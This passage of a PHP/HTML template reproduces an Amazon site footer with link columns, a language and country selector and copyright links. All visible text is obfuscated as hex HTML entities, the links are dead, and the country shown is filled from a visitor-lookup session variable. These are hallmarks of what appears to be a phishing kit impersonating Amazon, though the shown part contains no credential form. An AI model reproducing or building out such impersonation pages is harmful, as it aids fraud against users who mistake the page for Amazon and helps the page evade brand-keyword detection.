                            <li class='nav_first'><a href='#' class='nav_a'>&#x53;&#x65;&#x6C;&#x6C;&#x20;&#x6F;&#x6E;&#x20;&#x41;&#x6D;&#x61;&#x7A;&#x6F;&#x6E;</a></li>
                            <li><a href='#' class='nav_a'>&#x53;&#x65;&#x6C;&#x6C;&#x20;&#x59;&#x6F;&#x75;&#x72;&#x20;&#x53;&#x65;&#x72;&#x76;&#x69;&#x63;&#x65;&#x73;&#x20;&#x6F;&#x6E;&#x20;&#x41;&#x6D;&#x61;&#x7A;&#x6F;&#x6E;</a></li>
                            <li><a href='#' class='nav_a'>&#x53;&#x65;&#x6C;&#x6C;&#x20;&#x6F;&#x6E;&#x20;&#x41;&#x6D;&#x61;&#x7A;&#x6F;&#x6E;&#x20;&#x42;&#x75;&#x73;&#x69;&#x6E;&#x65;&#x73;&#x73;</a></li>
                            <li><a href='#' class='nav_a'>&#x53;&#x65;&#x6C;&#x6C;&#x20;&#x59;&#x6F;&#x75;&#x72;&#x20;&#x41;&#x70;&#x70;&#x73;&#x20;&#x6F;&#x6E;&#x20;&#x41;&#x6D;&#x61;&#x7A;&#x6F;&#x6E;</a></li>
                            <li><a href='#' class='nav_a'>&#x42;&#x65;&#x63;&#x6F;&#x6D;&#x65;&#x20;&#x61;&#x6E;&#x20;&#x41;&#x66;&#x66;&#x69;&#x6C;&#x69;&#x61;&#x74;&#x65;</a></li>
                            <li><a href='#' class='nav_a'>&#x41;&#x64;&#x76;&#x65;&#x72;&#x74;&#x69;&#x73;&#x65;&#x20;&#x59;&#x6F;&#x75;&#x72;&#x20;&#x50;&#x72;&#x6F;&#x64;&#x75;&#x63;&#x74;&#x73;</a></li>
                            <li><a href='#' class='nav_a'>&#x53;&#x65;&#x6C;&#x66;&#x2D;&#x50;&#x75;&#x62;&#x6C;&#x69;&#x73;&#x68;&#x20;&#x77;&#x69;&#x74;&#x68;&#x20;&#x55;&#x73;</a></li>
                            <li class='nav_last nav_a_carat'><span class="nav_a_carat">&rsaquo;</span><a href='#' class='nav_a'>&#x53;&#x65;&#x65;&#x20;&#x61;&#x6C;&#x6C;</a></li>
                        </ul>
                    </div>
                    <div class="navFooterColSpacerInner navAccessibility"></div>
                    <div class="navFooterLinkCol navAccessibility">
                        <div class="navFooterColHead">&#x41;&#x6D;&#x61;&#x7A;&#x6F;&#x6E;&#x20;&#x50;&#x61;&#x79;&#x6D;&#x65;&#x6E;&#x74;&#x20;&#x50;&#x72;&#x6F;&#x64;&#x75;&#x63;&#x74;&#x73;</div>
                        <ul>
                            <li class='nav_first'><a href='#' class='nav_a'>&#x41;&#x6D;&#x61;&#x7A;&#x6F;&#x6E;&#x20;&#x52;&#x65;&#x77;&#x61;&#x72;&#x64;&#x73;&#x20;&#x56;&#x69;&#x73;&#x61;&#x20;&#x53;&#x69;&#x67;&#x6E;&#x61;&#x74;&#x75;&#x72;&#x65;&#x20;&#x43;&#x61;&#x72;&#x64;&#x73;</a></li>
                            <li><a href='#' class='nav_a'>&#x41;&#x6D;&#x61;&#x7A;&#x6F;&#x6E;&#x2E;&#x63;&#x6F;&#x6D;&#x20;&#x53;&#x74;&#x6F;&#x72;&#x65;&#x20;&#x43;&#x61;&#x72;&#x64;</a></li>
                            <li><a href='#' class='nav_a'>&#x41;&#x6D;&#x61;&#x7A;&#x6F;&#x6E;&#x2E;&#x63;&#x6F;&#x6D;&#x20;&#x43;&#x6F;&#x72;&#x70;&#x6F;&#x72;&#x61;&#x74;&#x65;&#x20;&#x43;&#x72;&#x65;&#x64;&#x69;&#x74;&#x20;&#x4C;&#x69;&#x6E;&#x65;</a></li>
                            <li><a href='#' class='nav_a'>&#x53;&#x68;&#x6F;&#x70;&#x20;&#x77;&#x69;&#x74;&#x68;&#x20;&#x50;&#x6F;&#x69;&#x6E;&#x74;&#x73;</a></li>
                            <li><a href='#' class='nav_a'>&#x43;&#x72;&#x65;&#x64;&#x69;&#x74;&#x20;&#x43;&#x61;&#x72;&#x64;&#x20;&#x4D;&#x61;&#x72;&#x6B;&#x65;&#x74;&#x70;&#x6C;&#x61;&#x63;&#x65;</a></li>
                            <li><a href='#' class='nav_a'>&#x52;&#x65;&#x6C;&#x6F;&#x61;&#x64;&#x20;&#x59;&#x6F;&#x75;&#x72;&#x20;&#x42;&#x61;&#x6C;&#x61;&#x6E;&#x63;&#x65;</a></li>
                            <li class='nav_last'><a href='#' class='nav_a'>&#x41;&#x6D;&#x61;&#x7A;&#x6F;&#x6E;&#x20;&#x43;&#x75;&#x72;&#x72;&#x65;&#x6E;&#x63;&#x79;&#x20;&#x43;&#x6F;&#x6E;&#x76;&#x65;&#x72;&#x74;&#x65;&#x72;</a></li>
                        </ul>
                    </div>
                    <div class="navFooterColSpacerInner navAccessibility"></div>
                    <div class="navFooterLinkCol navAccessibility">
                        <div class="navFooterColHead">&#x4C;&#x65;&#x74;&#x20;&#x55;&#x73;&#x20;&#x48;&#x65;&#x6C;&#x70;&#x20;&#x59;&#x6F;&#x75;</div>
                        <ul>
                            <li class='nav_first'><a href='#' class='nav_a'>&#x59;&#x6F;&#x75;&#x72;&#x20;&#x41;&#x63;&#x63;&#x6F;&#x75;&#x6E;&#x74;</a></li>
                            <li><a href='#' class='nav_a'>&#x59;&#x6F;&#x75;&#x72;&#x20;&#x4F;&#x72;&#x64;&#x65;&#x72;&#x73;</a></li>
                            <li><a href='#' class='nav_a'>&#x53;&#x68;&#x69;&#x70;&#x70;&#x69;&#x6E;&#x67;&#x20;&#x52;&#x61;&#x74;&#x65;&#x73;&#x20;&#x26;&#x20;&#x50;&#x6F;&#x6C;&#x69;&#x63;&#x69;&#x65;&#x73;</a></li>
                            <li><a href='#' class='nav_a'>&#x41;&#x6D;&#x61;&#x7A;&#x6F;&#x6E;&#x20;&#x50;&#x72;&#x69;&#x6D;&#x65;</a></li>
                            <li><a href='#' class='nav_a'>&#x52;&#x65;&#x74;&#x75;&#x72;&#x6E;&#x73;&#x20;&#x26;&#x20;&#x52;&#x65;&#x70;&#x6C;&#x61;&#x63;&#x65;&#x6D;&#x65;&#x6E;&#x74;&#x73;</a></li>
                            <li><a href='#' class='nav_a'>&#x4D;&#x61;&#x6E;&#x61;&#x67;&#x65;&#x20;&#x59;&#x6F;&#x75;&#x72;&#x20;&#x43;&#x6F;&#x6E;&#x74;&#x65;&#x6E;&#x74;&#x20;&#x61;&#x6E;&#x64;&#x20;&#x44;&#x65;&#x76;&#x69;&#x63;&#x65;&#x73;</a></li>
                            <li><a href='#' class='nav_a'><?=$I_22;?></a></li>
                            <li class='nav_last'><a href='#' class='nav_a'><?=$I_19;?></a></li>
                        </ul>
                    </div>
                </div>
            </div>
            <div class="nav-footer-line"></div>
            <div class="navFooterLine navFooterLinkLine navFooterPadItemLine">
                <span>
                        <div class="navFooterLine navFooterLogoLine">
                           <a href="#">
                              <div class="nav-logo-base nav-sprite"></div>
                           </a>
                        </div>
                     </span>
                <ul></ul>
                <span class="icp-container-desktop">
                        <div class="navFooterLine">
                           <style type="text/css">
                              #icp-touch-link-language { display: none; }
                           </style>
                           <a href="#" class="icp-button" id="icp-touch-link-language">
                              <div class="icp-nav-globe-img-2 icp-button-globe-2"></div
                                 >
                              <span class="icp-color-base">English</span
                                 ><span class="nav-arrow icp-up-down-arrow"></span>
                </a>
                <style type="text/css">
                    #icp-touch-link-country { display: none; }
                </style>
                <a href="#" class="icp-button" id="icp-touch-link-country">
                           <span class="icp-flag-3 icp-flag-3-<?=$_SESSION['_LOOKUP_CNTRCODELOW_'];?>"></span
                              ><span class="icp-color-base"><?=$_SESSION['_LOOKUP_COUNTRY_'];?></span>
                           </a>
            </div>
            </span>
            <ul></ul>
        </div>
        <div class="navFooterLine navFooterLinkLine navFooterPadItemLine navFooterCopyright">
            <ul>
                <li class='nav_first'><a href='#' class='nav_a'><?=$I_17;?></a></li>
                <li><a href='#' class='nav_a'><?=$I_18;?></a></li>
                <li><a href='#' class='nav_a'><?=$I_21;?></a></li>
                <li class='nav_last'><?=$I_20;?></li>
            </ul>
        </div>
    </div>
    </div>
    </div>
    </div>
</body>